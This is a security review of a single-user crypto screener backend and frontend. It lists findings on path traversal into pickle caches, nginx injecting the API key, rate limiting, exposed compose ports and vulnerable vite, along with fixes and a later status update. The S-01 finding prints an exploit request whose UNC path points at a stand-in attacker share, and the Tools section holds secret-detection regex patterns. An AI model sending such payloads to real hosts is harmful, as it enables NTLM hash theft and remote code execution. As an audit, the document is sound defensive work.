# Security review - chore/audit - main (b5a450f) .. b9804c2 - 2026-10-25

## Security

Reviewer: security-reviewer (read-only; no code changed). Scope: whole backend/frontend/deploy config on `chore/audit` (15 commits ahead of `main`), with emphasis on the audit fixes (auth, CORS, cron, rate limit, validation, Docker, nginx).
Project type: finance/screener, single-user tool, no order placement (`grep create_order|withdraw` -> no hits), so the money path is n.a.; tier-A categories 1, 2, 5, 8 traced fully.

### Summary
| Severity | Count | IDs |
|---|---|---|
| P0 | 0 | - |
| P1 | 0 open (S-01 closed: symbol validation + JSON cache; S-02 mitigated by allowlist, see below) | - |
| P2 | 5 | S-03, S-04, S-05, S-06, S-07 |
| P3 | 3 | S-08, S-09, S-10 |

Nothing needs rotation: secret scan of the tree and the full git history is clean (see Tools).

### Categories
| # | Category | Status | Evidence |
|---|---|---|---|
| 1 | Access control | checked | All 5 `/api/v1` routers mounted with `auth_dependencies` (`backend/app/main.py:36-55`); cron router has its own `require_cron_secret` (`main.py:39`, `routes.py:161-162`). Single-tenant app, no user/ownership model, so no IDOR surface. Bypass via nginx key injection -> S-02. Open by default -> S-06. |
| 2 | Authentication | checked | `hmac.compare_digest` (`backend/app/api/security.py:15-16`), 401 on missing/wrong key (`:28-29`), cron Bearer or API key (`:39-42`), `REQUIRE_AUTH` startup guard (`main.py:61-62`); tests `backend/tests/test_api_security.py:9-36`. No sessions/cookies. |
| 3 | Injection | checked | SQL: ORM with bound params everywhere; only f-string SQL is `database.py:349` with constants from `_EXPECTED_COLUMNS` (`:327-332`) and `postgres_store.py:135` with `int(limit)` - safe. No shell/eval/yaml/template sinks (grep empty). Path traversal into pickle cache -> S-01. No LLM. |
| 4 | XSS / CSRF / CORS | checked | React escapes; no `dangerouslySetInnerHTML`/`href=` from data (grep). `main.tsx:25` innerHTML only with a local render error (not attacker data). CORS explicit allowlist, `allow_credentials=False` (`main.py:27-33`), tested (`test_api_security.py:19-25`). Localhost CSRF/DNS rebinding -> S-08. |
| 5 | SSRF | checked | `DATA_LAYER_URL` is declared (`config.py:30`) but never read (`grep -rn DATA_LAYER_URL backend/app` -> only config). ccxt calls go to the fixed Binance host; symbols are resolved via loaded markets (`BadSymbol` otherwise), never concatenated into a URL. Windows UNC path in the cache filename is an SMB fetch -> part of S-01. |
| 6 | Uploads / deserialization | checked | No uploads (`client_max_body_size 1m`, `nginx.conf.template:6`). `pickle.load` on cache files -> S-01. |
| 7 | Money / credits | n.a. | No orders, payments or ledger. Positions are manual records; PnL uses client-supplied prices and is informational only (`routes_positions.py:196-225`). |
| 8 | Secrets / data exposure | checked | No secrets in tree or history; `.env`, `.env.local` ignored (`.gitignore:45-46`, `git check-ignore` confirms `backend/.env`, `frontend/.env`); key not bundled (frontend `api.ts` sends no key; Vite proxy adds it server-side, `vite.config.ts:26`). Key exposure through nginx -> S-02. Error text leakage -> S-09. |
| 9 | Abuse / DoS | checked | Rate limits exist (`security.py:65-68`) but key on proxy IP and miss heavy routes -> S-03, S-04. |
| 10 | Dependencies / config | checked | pip-audit: runtime deps clean, only pip/setuptools of the audit venv; npm audit: 0 prod, 5 dev (vite high) -> S-07. Docker non-root (`Dockerfile:12-15`), compose binds 127.0.0.1 with required passwords (`docker-compose.yml:19,30,66`). Datalayer compose -> S-05. |

### Findings

S-01 | P1 | `backend/app/modules/screener/data_loader.py:399-400,442-445` (sources: `backend/app/api/routes_backtester.py:26-27,62-69` -> `backend/app/modules/backtester/backtester.py:60-61`; `backend/app/api/schemas.py:13` -> `backend/app/modules/screener/screener.py:48-49,71-77`) | CWE-22 + CWE-502 (OWASP A03/A08), STRIDE T/E |
The asset symbol from `POST /api/v1/backtester/run` (`asset_a`, `asset_b`) and `POST /api/v1/screener/run` (`assets[]`) is not validated and becomes the cache filename: `self._cache_dir / f"{cache_key.replace('/', '_')}.pkl"`. Only `/` is replaced. On a Windows host (this repo's dev machine) `\` is a separator and a drive/UNC prefix replaces the base path - verified with `PureWindowsPath('cache/price_data') / '\\\\evil.host\\share\\p_365.pkl'` -> `\\evil.host\share\p_365.pkl`. The file check runs before any Binance call, so `cache_file.exists()` + `pickle.load()` read an attacker-hosted pickle. Exploit: someone who can reach the API (default `API_KEY` unset; `backend/run.py:9` and `frontend/vite.config.ts:17` bind `0.0.0.0` on the LAN; or a DNS-rebinding page against 127.0.0.1, S-08) posts `{"asset_a":"\\\\attacker\\share\\p","asset_b":"BTC","lookback_days":365}` -> Windows connects over SMB (NTLM hash leak) and unpickles the attacker file -> code execution as the developer. Same path also lets `cache_file.unlink()` (`:459,465`) delete any reachable `*_<days>.pkl`. On Linux/Docker the traversal does not work (no `\` separator), which is why this is P1, not P0.
Fix: (1) validate symbols at every entry point with `re.fullmatch(r"[A-Z0-9]{1,20}", s)` (move `_ASSET_RE` from `validation.py` into a shared Pydantic `constr`/validator on `BacktestRequest.asset_a/b` and `ScreeningConfigRequest.assets` with `max_length` on the list); (2) in `get_price_series` reject keys that fail `fullmatch(r"[A-Za-z0-9_]+")` and assert `cache_file.resolve().is_relative_to(self._cache_dir.resolve())`; (3) replace pickle with a data-only format (parquet/CSV/JSON via `Series.to_json`), so a planted file cannot execute code. Regression tests: backslash, drive, UNC and `..` symbols return 422.

S-02 | P1 | `frontend/nginx.conf.template:12-16`, `frontend/Dockerfile:10-13`, `frontend/railway.json:4-5`, `docker-compose.yml:82-84` | CWE-306 / CWE-200 (OWASP A01), STRIDE S/E |
nginx adds `X-API-Key: ${API_KEY}` to every `/api/` request it proxies, for any client, with `server_name _`. The API key therefore authenticates the nginx listener, not the caller. On the Railway frontend deployment (Dockerfile builder, public URL) anyone on the internet gets the full authenticated API: list/delete positions and alerts, run backtests and screenings, and `GET /api/v1/screener/cron/run` (cron accepts the API key, `security.py:41-42`), i.e. the auth fix is a no-op for that deployment. In compose it is bound to 127.0.0.1:3100, so exposure there is local processes and DNS rebinding (nginx accepts any Host).
Fix: pick one: (a) keep nginx injection only for loopback/private deployments and put real user auth in front (Railway/Cloudflare Access, basic auth `auth_basic` in nginx, or an OAuth proxy) before setting `API_KEY` in a public frontend; or (b) do not inject; let the browser send a user-entered key (stored in memory/sessionStorage) and keep CORS strict. At minimum restrict `server_name` to the real host(s) and return 444 for others, and give the cron route a separate secret that nginx never injects (drop the API-key fallback in `require_cron_secret` or block `/api/v1/screener/cron/` in nginx).

S-03 | P2 | `backend/app/api/security.py:55`, `frontend/nginx.conf.template:12-16`, `Dockerfile:21` | CWE-770 / CWE-348, STRIDE D |
The limiter keys on `request.client.host`. Behind nginx (compose/Railway) every user arrives from the nginx container/edge IP; nginx sets no `X-Forwarded-For`, and uvicorn trusts forwarded headers only from 127.0.0.1 by default, so all clients share one bucket. Exploit: one client sends 6 requests/min to `POST /screener/run-live` and nobody else can start a screening; 240 req/min to any route returns 429 to every user. Conversely, if someone "fixes" it with `--forwarded-allow-ips='*'` while the backend port is public, `X-Forwarded-For` becomes client-controlled and the limit is bypassed by rotating the header. Also `self.hits` (`:52,57`) never drops empty keys, so distinct IPs grow memory without bound.
Fix: in nginx add `proxy_set_header X-Forwarded-For $remote_addr;` (overwrite, not append) and `X-Real-IP $remote_addr`; run uvicorn with `--proxy-headers --forwarded-allow-ips=<nginx/edge CIDR only>`; keep the backend port private. Delete empty deques after pruning. Single-process limiter is documented; for multiple workers move to Redis.

S-04 | P2 | `backend/app/api/routes_backtester.py:43-69`, `backend/app/api/routes.py:161-171,527-528`, `backend/app/api/schemas.py:13` | CWE-400, STRIDE D |
Heavy work is not behind `expensive_limit` and runs synchronously inside `async def` handlers, blocking the event loop: `POST /backtester/run` (two price fetches + full backtest, limited only by the 240/min general limit), `GET /screener/pairs/{id}/spread` (rolling OLS per bar), and `/screener/cron/run` calls `_run_screening()` inline in an `async def` (minutes of blocking for every other request). `ScreeningConfigRequest.assets` has no length cap, so `POST /screener/run` with thousands of symbols forms O(n^2) pairs and fires one Binance request per unknown symbol (risk of a Binance IP ban for the server). Exploit: any API client (or anyone via S-02) loops `/backtester/run` and the API stops answering.
Fix: add `Depends(expensive_limit)` to backtest and spread routes; make these handlers plain `def` (threadpool) or wrap the work in `run_in_threadpool`; `assets: Optional[List[constr(pattern=...)]] = Field(None, max_length=500)`.

S-05 | P2 | `docker-compose.datalayer.yml:19-21,28-33,51-52` | CWE-1392 / CWE-284 (OWASP A05), STRIDE I/T |
The data-layer compose publishes Redis without a password on `6379`, Postgres with `datalayer/datalayer` on `5432`, and the data-layer API on `8001`, all on 0.0.0.0. Docker publishes past host firewalls (ufw), so on a VPS anyone can read/flush Redis (and use Redis as a write primitive) and read/alter the candle store. The data-layer HTTP API (`backend/app/data_layer/serving/api.py:49-89`) has no auth (read-only public market data, acceptable if not public). README:95 warns, but the file is still a footgun; the main `docker-compose.yml` already does this right.
Fix: mirror `docker-compose.yml`: `127.0.0.1:` port bindings (or no `ports` for Redis/Postgres), `${REDIS_PASSWORD:?}` / `${POSTGRES_PASSWORD:?}`, or delete this file and keep the main compose only.

S-06 | P2 | `backend/app/config.py:56-58`, `backend/app/api/security.py:26-27,37-38`, `Dockerfile:21`, `nixpacks.toml` (start cmd), `Procfile:1` | CWE-1188 (OWASP A05), STRIDE S |
Auth fails open: with `API_KEY` unset every route (including cron) is public, and `REQUIRE_AUTH` defaults to `false`. Only `docker-compose.yml:68` sets `REQUIRE_AUTH=true`; the Railway/Nixpacks/Procfile/Vercel entry points that bind a public port do not. A deploy with a forgotten env var is fully open with no warning.
Fix: default `REQUIRE_AUTH=true` and set `REQUIRE_AUTH=false` explicitly in the dev commands/`.env.example`; or set `ENV REQUIRE_AUTH=true` in the backend `Dockerfile`; log a loud warning at startup when the API is open.

S-07 | P2 | `frontend/package.json:25` (`vite ^5.0.8`), `frontend/vite.config.ts:17,26` | known-vulnerable dependency (OWASP A06), STRIDE I |
`npm audit`: vite <=6.4.3 high (path traversal in optimized deps `.map`, `server.fs.deny` bypass on Windows alternate paths, cross-origin script execution via middleware, launch-editor NTLM hash disclosure via UNC on Windows), esbuild <=0.24.2 moderate (any website can read dev-server responses), postcss-selector-parser moderate (ReDoS, build-time). Production bundle is unaffected (`npm audit --omit=dev` -> 0), but the dev server listens on `0.0.0.0` (`vite.config.ts:17`) on a Windows machine and its proxy injects `API_KEY` (`:26`): LAN hosts can read local files through the fs.deny bypass and use the authenticated proxy to reach S-01.
Fix: upgrade to vite >= 6.4.4 (or 7.x) and `@vitejs/plugin-react` accordingly; remove `host: '0.0.0.0'` (default localhost; use `--host` explicitly when needed). Same for `backend/run.py:9` (`host="0.0.0.0"`, `reload=True`) - default to `127.0.0.1`.

S-08 | P3 | `backend/app/main.py:20-33` (no Host check), `backend/app/api/routes_alerts.py:63-70`, `frontend/nginx.conf.template:3` | CWE-352 / CWE-350, STRIDE S/T |
Local dev runs without `API_KEY`. No `TrustedHostMiddleware`, so a DNS-rebinding page can call `127.0.0.1:8000` same-origin (this is the localhost route into S-01). Separately, `POST /api/v1/alerts/` takes only query params, so a cross-site "simple" POST (no preflight) creates alerts; `POST /live/start` and `POST /screener/run-live` (no body) are also simple requests that start Binance polling. JSON-body routes are safe from plain CSRF because FastAPI only parses `application/json` bodies. Impact alone is low (no secrets, no money), hence P3; it raises S-01.
Fix: `TrustedHostMiddleware(allowed_hosts=["localhost","127.0.0.1", <prod host>])`; require `Content-Type: application/json` (or the API key) on state-changing routes; move alert creation params to a JSON body; nginx `server_name` to the real host (also S-02).

S-09 | P3 | `backend/app/api/routes.py:294` (exposed by `:150`), `backend/app/main.py:88-92`, `backend/app/main.py:20` | CWE-209 / CWE-200, STRIDE I |
`GET /screener/status` returns `last_error = f"Screening failed: {e}"` and unauthenticated `GET /health` returns `screener_error: str(e)`; raw exception text (ccxt errors include request URLs/response bodies, file paths). `/docs` and `/openapi.json` are public even when `API_KEY` is set, mapping the whole API for an attacker. No secret values are known to appear in these strings (keys are not in ccxt error text), so P3.
Fix: return a fixed message and log the detail server-side; `FastAPI(docs_url=None, redoc_url=None, openapi_url=None)` when `REQUIRE_AUTH` is true (or mount docs behind the key).

S-10 | P3 | `frontend/nginx.conf.template:8-10` | CWE-693 (OWASP A05) |
nginx sets `nosniff`, `X-Frame-Options DENY`, `Referrer-Policy`, but no `Content-Security-Policy` and no HSTS. Low risk (no user HTML), defense in depth.
Fix: `add_header Content-Security-Policy "default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'" always;` and HSTS when served over TLS.

### What is OK (verified)
- API-key check is constant-time and covers every `/api/v1` router; unauthenticated only `/`, `/health`, `/docs`, `/openapi.json` (`main.py:36-55,66-92`); tests pass for 401/200, CORS allow/deny, cron 401/200 (`backend/tests/test_api_security.py:5-36`).
- Cron: Bearer `CRON_SECRET` (Vercel Cron header) or API key, compared with `compare_digest`, rate-limited 6/min (`routes.py:161-162`, `security.py:32-43`).
- CORS: explicit origins from env, `allow_credentials=False`, explicit method/header lists (`main.py:27-33`).
- SQL: SQLAlchemy ORM filters (`routes.py:83-86,423`, `routes_alerts.py:37,117`, `routes_positions.py:141`), asyncpg `$n` params (`postgres_store.py:94-95,124-138`); `pair_id`, `alert_id`, `position_id`, `session_id` are typed `int` path params (422 otherwise).
- Pair-bound writes: alerts/positions require a regex-valid symbol pair that matches an existing `pair_id` (`validation.py:11-31`, used at `routes_alerts.py:73`, `routes_positions.py:47`); position side regex and positive quantities/prices (`routes_positions.py:35-40`).
- Export endpoints: no filesystem access; CSV/XLSX built in memory (`routes.py:1216-1390`); filenames contain only timestamps and Binance market symbols (pairs exist only for symbols ccxt resolved), no user-controlled header text.
- Live history: symbols only index an in-memory dict (`routes_live.py:32-39`, `intraday_monitor.py:100`).
- SSRF: no user-supplied URL anywhere; `DATA_LAYER_URL` unused; ccxt host fixed.
- Docker: backend non-root uid 10001 (`Dockerfile:12-15`), healthcheck, frontend `nginx-unprivileged`; main compose binds every port to 127.0.0.1 and requires `REDIS_PASSWORD`, `POSTGRES_PASSWORD`, `API_KEY` via `:?` (`docker-compose.yml:19,30,66,84`); `.dockerignore` excludes `backend/cache/`, `backend/data/`; `frontend/.dockerignore` excludes `.env`.
- nginx template: values come from deploy env via envsubst, not from requests, so no header injection; client-sent `X-API-Key` is overwritten by `proxy_set_header`; body cap 1 MB.
- Secrets: none in tree/history; Binance keys optional and only used for public market data (no order/withdraw calls); frontend bundle has no key (only `VITE_API_URL`).

### Tools (commands and output; no secret values)
```
$ scratchpad/venv2/Scripts/pip-audit.exe --local
Found 21 known vulnerabilities in 2 packages
pip        24.0    PYSEC-2026-1795/1796/2875/2876/196/3721   fix 25.3 .. 26.2
setuptools 65.5.0  PYSEC-2022-43012, PYSEC-2025-49, PYSEC-2026-1918, PYSEC-2026-3447, GHSA-xmj3-9gf7-h52w   fix 65.5.1 .. 84.1.0
(installed runtime deps from requirements.txt - fastapi 0.162.0, starlette 1.9.0, uvicorn 0.54.0, ccxt 4.5.90,
 pandas 3.0.6, pydantic 2.14.1, SQLAlchemy 2.0.23, openpyxl 3.1.5, aiohttp 3.14.5, requests 2.34.2, urllib3 2.8.0: no findings)
```
pip/setuptools are packaging tools of the venv, not app dependencies. The `python:3.11-slim` image ships its own pip; optional `pip install --upgrade pip setuptools` in the Dockerfile build stage (P3, build-time only).

```
$ cd frontend && npm audit
esbuild                 moderate  <=0.24.2   dev server: any website can send requests and read responses
postcss-nested          moderate  2.0.3-6.2.0 (via postcss-selector-parser)
postcss-selector-parser moderate  <7.1.6     quadratic selector parsing (CPU)
tailwindcss             moderate  <=3.4.19   (via postcss-nested / selector-parser)
vite                    high      <=6.4.3    path traversal in .map, fs.deny bypass on Windows, cross-origin script exec,
                                             launch-editor NTLM disclosure via UNC / cmd arg issues, esbuild
5 vulnerabilities (4 moderate, 1 high)
$ npm audit --omit=dev
found 0 vulnerabilities
```

```
$ grep -rlE 'sk-[A-Za-z0-9_-]{20,}|AIza[0-9A-Za-z_-]{35}|xox[abprs]-...|-----BEGIN [A-Z ]*PRIVATE KEY-----|[0-9]{8,10}:AA[A-Za-z0-9_-]{33}|AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}' . (excl node_modules/.git/venv/dist)
(no files)
$ git log --all -p -G'<same pattern>'
(no commits)
$ git log --all --name-only | grep -iE '\.env|\.pem|\.key|id_rsa|credentials'
.env.example            (placeholders only)
$ git grep -nE '(API_KEY|SECRET|PASSWORD|TOKEN)\s*[:=]\s*[A-Za-z0-9_-]{12,}'
(no hits)
gitleaks / detect-secrets: not installed
```
The built-in `security-review` skill was not run; every category above was traced manually in code.

### Dropped candidates
- CSV/XLSX formula injection and `Content-Disposition` header injection via asset names: names in results come only from symbols ccxt resolved on Binance (`[A-Z0-9]`), user strings never reach the export.
- `_ASSET_RE` with `$` accepts a trailing `\n` (`validation.py:11,17`): the symbol set must still equal the stored pair's assets, so `"BTC\n"` gets 422; no impact (still prefer `fullmatch`).
- SQL injection in `database.py:349` and `postgres_store.py:135`: constants and `int()` only.
- `main.tsx:25` `innerHTML` with `${error}`: the value is a local React render exception, not attacker data.
- Pickle cache on Linux/Docker as a standalone RCE: cache dir is owned by the app user and not a shared volume; needs a prior write primitive. Covered by S-01 fix (drop pickle).
- Data-layer `/ticker?symbol=` reflected in JSON 404 detail: JSON response, no XSS; key used only as a Redis lookup.
- `limit` query params without bounds (`/sessions`, `/results`, exports): slicing an in-memory list or SQLite `LIMIT`; no amplification beyond existing rows.

### Trap-worthy (for known-traps.md, Security)
- 2026-10-25 - **Filename sanitizing with `.replace('/', '_')` is not enough on Windows**: `\`, `C:\` and `\\host\share` survive and `pathlib` joins an absolute/UNC part by replacing the base; with `pickle.load` this is SMB-fetched RCE. Allowlist the key (`fullmatch [A-Za-z0-9_]+`), check `resolve().is_relative_to(base)`, never unpickle caches.
- 2026-10-25 - **Reverse proxy that injects the API key turns auth off** for everyone who can reach the proxy. Inject only on loopback/private networks or put user auth in front.
- 2026-10-25 - **IP rate limiter behind a proxy keys on the proxy IP** (one bucket for all) unless the proxy overwrites `X-Forwarded-For` and the app trusts it only from the proxy CIDR.


## Status 2026-11-05
- S-01 closed: symbols validated at API and loader, cache path resolved under cache dir, cache is JSON (no pickle).
- S-02 mitigated (safest default, owner may change): the frontend nginx only serves /api/ to loopback, 172.16/12, 192.168/16 and FRONTEND_ALLOW_CIDR; everyone else gets 403; /api/v1/screener/cron/ is 404 through the proxy (cron uses CRON_SECRET directly on the backend). A public deployment still needs real user auth in front (SSO/VPN/auth_basic) because the proxy injects API_KEY.
- S-03 fixed: X-Forwarded-For overwritten by nginx, uvicorn trusts forwarded headers only from 172.16/12, limiter drops idle keys.
- S-07 reduced: vite 5.4.21; remaining npm advisories are dev-server only (esbuild/vite <= 6, fix needs a breaking vite upgrade; `npm install vite@7` hit a peer conflict).
- S-04 (request size/cost bounds), S-06 (default open API when API_KEY unset) unchanged.
